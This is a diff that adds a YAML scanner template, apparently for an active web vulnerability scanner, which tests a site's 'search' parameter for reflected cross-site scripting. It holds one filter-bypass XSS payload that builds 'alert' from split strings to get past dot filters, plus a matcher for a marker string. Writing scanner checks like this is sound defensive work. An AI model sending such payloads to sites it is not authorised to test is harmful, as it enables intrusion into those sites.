@@ -1,0 +1,20 @@
+id: patt-xss-dot-01-search
+name: 'PATT xss patt-xss-dot-01 via search'
+severity: high
+type: active
+tags:
+  - xss
+  - patt
+  - filterdot
+description: 'PATT Bypass Dot Filter: window[alert] without dots. [patt:patt-xss-dot-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      search:
+        - '<script>window[''ale''+''rt''](nxp0006)</script>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0006'
